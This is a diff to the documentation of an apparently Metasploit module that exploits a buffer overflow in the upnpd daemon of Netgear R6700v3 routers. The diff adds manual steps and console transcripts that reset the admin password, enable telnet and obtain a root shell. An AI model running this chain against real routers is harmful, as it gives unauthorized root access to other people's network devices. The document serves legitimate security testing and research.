@@ -1,16 +1,27 @@
 ## Description
 
-This module exploits a buffer overflow vulnerability in the upnpd daemon (/usr/sbin/upnpd), running on the router Netgear R6700v3, ARM Architecture, firmware version V1.0.4.82_10.0.57 and V1.0.4.84_10.0.58.
-The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to use a default admin password to login to web interface and use a 'telnetenable' module to gain root shell.
+This module exploits a buffer overflow vulnerability in the upnpd daemon (/usr/sbin/upnpd), running on the router Netgear R6700v3, ARM Architecture, firmware version V1.0.4.82_10.0.57 and V1.0.4.84_10.0.58. Previous versions or models might also be vulnerable but they were not tested and would require additional offset information to work properly. Refer to the advisory for details on how to identify offsets in new versions.
+
+The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. It will reset admin password to a factory defaults "password". After using this module, to achieve code execution, do the following steps manually:
+
+1. Login to 192.168.1.1 with creds 'admin:password', then:
+  * go to Advanced -> Administration -> Set Password
+ 	* Change the password from 'password' to <WHATEVER>
+2. Run metasploit as root, then:
+ 	* use exploit/linux/telnet/netgear_telnetenable
+ 	* set interface <INTERFACE_CONNECTED_TO_ROUTER>
+ 	* set rhost 192.168.1.1
+ 	* set username admin
+ 	* set password <WHATEVER>
+ 	* run it and login with 'admin:<WHATEVER>'
+3. Enjoy your root shell!
 
 This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the team Flashback (Pedro Ribeiro + Radek Domanski).
 
 ## Vulnerable Application
 
-* Netgear R6700v3 firmware version V1.0.4.82_10.0.57
-* Netgear R6700v3 firmware version V1.0.4.84_10.0.58
-
-[Netgear R6700v3 Firmware V1.0.4.84_10.0.5](http://www.downloads.netgear.com/files/GDC/R6700v3/R6700v3-V1.0.4.84_10.0.58.zip)
+* [Netgear R6700v3 firmware version V1.0.4.82_10.0.57](http://www.downloads.netgear.com/files/GDC/R6700v3/R6700v3-V1.0.4.82_10.0.57.zip)
+* [Netgear R6700v3 firmware version V1.0.4.84_10.0.58](http://www.downloads.netgear.com/files/GDC/R6700v3/R6700v3-V1.0.4.84_10.0.58.zip)
 
 
 
@@ -26,20 +37,20 @@ This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the tea
   7. Admin password has been reset to default `password`
 
 ## Options
-```
-Module options (auxiliary/admin/http/netgear_r6700_pass_reset):
 
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   RPORT    5000             yes       The target port (TCP)
-   SSL      false            no        Negotiate SSL/TLS for outgoing connections
-   VHOST                     no        HTTP server virtual host
-```
+### RHOSTS
+
+IP address of the LAN interface of the vulnerable target.
+
+### RPORT 
+
+upnpd port on the target. Default 5000.
 
 ## Scenarios
-~~~
+
+### Netgear R6700v3 firmware version V1.0.4.84_10.0.58
+
+```
 msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOST 192.168.1.1
 RHOST => 192.168.1.1
 msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > check 
@@ -111,4 +122,39 @@ uid=0(admin) gid=0(root)
 uname -a
 Linux R6700v3 2.6.36.4brcmarm+ #17 SMP PREEMPT Sat Oct 19 11:17:27 CST 2019 armv7l unknown
 
-~~~
+```
+
+### Netgear R6700v3 firmware version V1.0.0.4.82_10.0.57
+
+```
+msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > show options
+
+Module options (auxiliary/admin/http/netgear_r6700_pass_reset):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.1.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    5000             yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
+
+msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
+[*] Running module against 192.168.1.1
+
+[*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.
+[+] 192.168.1.1:5000 - HTTP payload sent! 'admin' password has been reset to 'password'
+[*] To achieve code execution, do the following steps manually:
+[*] 1- Login to 192.168.1.1 with creds 'admin:password', then:
+[*]     1.1- go to Advanced -> Administration -> Set Password
+[*]     1.2- Change the password from 'password' to <WHATEVER>
+[*] 2- Run metasploit as root, then:
+[*]     2.1- use exploit/linux/telnet/netgear_telnetenable
+[*]     2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>
+[*]     2.3- set rhost 192.168.1.1
+[*]     2.3- set username admin
+[*]     2.4- set password <WHATEVER>
+[*]     2.5- run it and login with 'admin:<WHATEVER>'
+[*] 3- Enjoy your root shell!
+[*] Auxiliary module execution completed
+```
